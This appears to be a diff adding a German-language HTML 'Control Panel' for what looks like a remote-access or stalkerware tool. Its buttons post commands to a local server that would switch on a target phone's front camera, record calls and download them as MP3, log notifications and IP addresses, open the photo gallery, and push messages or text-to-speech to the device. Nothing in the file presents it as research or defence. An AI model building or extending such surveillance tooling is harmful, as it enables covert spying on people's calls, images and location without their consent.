@@ -1,0 +1,158 @@
+<!DOCTYPE html>
+<html lang="de">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Turans World - Control Panel</title>
+    <style>
+        body {
+            background-color: black;
+            color: red;
+            font-family: Arial, sans-serif;
+        }
+        h1 {
+            text-align: center;
+        }
+        .container {
+            text-align: center;
+            margin-top: 50px;
+        }
+        button {
+            padding: 10px 20px;
+            background-color: red;
+            color: white;
+            border: none;
+            cursor: pointer;
+            margin: 10px;
+        }
+        button:hover {
+            background-color: darkred;
+        }
+        input, textarea {
+            padding: 10px;
+            background-color: #333;
+            color: white;
+            border: none;
+            margin: 10px;
+        }
+    </style>
+</head>
+<body>
+    <h1>Turans World - Control Panel</h1>
+    <div class="container">
+        <h2>Kamera und Sensoren</h2>
+        <button onclick="startFrontCamera()">Frontkamera einschalten</button>
+        <button onclick="startHeartRate()">Herzfrequenz messen</button>
+
+        <h2>Anrufe</h2>
+        <button onclick="startCallRecording()">Anruf aufzeichnen</button>
+        <button onclick="downloadLastCall()">Letzten Anruf als MP3 herunterladen</button>
+
+        <h2>Benachrichtigungen und Galerie</h2>
+        <button onclick="logNotifications()">Benachrichtigungen loggen</button>
+        <button onclick="viewGallery()">Galerie anzeigen</button>
+
+        <h2>IP Logger</h2>
+        <button onclick="logIPAddress()">IP-Adresse loggen</button>
+
+        <h2>Nachricht senden</h2>
+        <textarea id="messageInput" placeholder="Nachricht eingeben"></textarea><br>
+        <button onclick="sendMessage()">Nachricht senden</button>
+
+        <h2>Text-to-Speech</h2>
+        <textarea id="ttsInput" placeholder="Text für Sprachausgabe"></textarea><br>
+        <button onclick="sendTTS()">Text-to-Speech senden</button>
+    </div>
+
+    <script>
+        const serverURL = 'http://localhost:3000'; // Passe dies bei Bedarf an
+
+        // Frontkamera einschalten
+        function startFrontCamera() {
+            fetch(`${serverURL}/send_command?command=start_camera`, { method: 'POST' })
+                .then(response => response.text())
+                .then(data => alert(data))
+                .catch(error => console.error('Error:', error));
+        }
+
+        // Herzfrequenz messen
+        function startHeartRate() {
+            fetch(`${serverURL}/send_command?command=start_heart_rate`, { method: 'POST' })
+                .then(response => response.text())
+                .then(data => alert(data))
+                .catch(error => console.error('Error:', error));
+        }
+
+        // Anruf aufzeichnen
+        function startCallRecording() {
+            fetch(`${serverURL}/send_command?command=start_call_recording`, { method: 'POST' })
+                .then(response => response.text())
+                .then(data => alert(data))
+                .catch(error => console.error('Error:', error));
+        }
+
+        // Letzten Anruf als MP3 herunterladen
+        function downloadLastCall() {
+            fetch(`${serverURL}/send_command?command=download_last_call`, { method: 'POST' })
+                .then(response => response.blob())
+                .then(blob => {
+                    const url = window.URL.createObjectURL(blob);
+                    const a = document.createElement('a');
+                    a.style.display = 'none';
+                    a.href = url;
+                    a.download = 'call_recording.mp3';
+                    document.body.appendChild(a);
+                    a.click();
+                    window.URL.revokeObjectURL(url);
+                })
+                .catch(error => console.error('Error:', error));
+        }
+
+        // Benachrichtigungen loggen
+        function logNotifications() {
+            fetch(`${serverURL}/send_command?command=log_notifications`, { method: 'POST' })
+                .then(response => response.text())
+                .then(data => alert(data))
+                .catch(error => console.error('Error:', error));
+        }
+
+        // Galerie anzeigen
+        function viewGallery() {
+            fetch(`${serverURL}/send_command?command=view_gallery`, { method: 'POST' })
+                .then(response => response.text())
+                .then(data => alert(data))
+                .catch(error => console.error('Error:', error));
+        }
+
+        // IP-Adresse loggen
+        function logIPAddress() {
+            fetch(`${serverURL}/send_command?command=log_ip`, { method: 'POST' })
+                .then(response => response.text())
+                .then(data => alert(`IP-Adresse: ${data}`))
+                .catch(error => console.error('Error:', error));
+        }
+
+        // Nachricht senden
+        function sendMessage() {
+            const message = document.getElementById('messageInput').value;
+            fetch(`${serverURL}/send_message`, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ message })
+            })
+            .then(response => response.text())
+            .then(data => alert(data))
+            .catch(error => console.error('Error:', error));
+        }
+
+        // Text-to-Speech senden
+        function sendTTS() {
+            const ttsText = document.getElementById('ttsInput').value;
+            fetch(`${serverURL}/send_command?command=text_to_speech&text=${encodeURIComponent(ttsText)}`, { method: 'POST' })
+                .then(response => response.text())
+                .then(data => alert(data))
+                .catch(error => console.error('Error:', error));
+        }
+    </script>
+</body>
+</html>
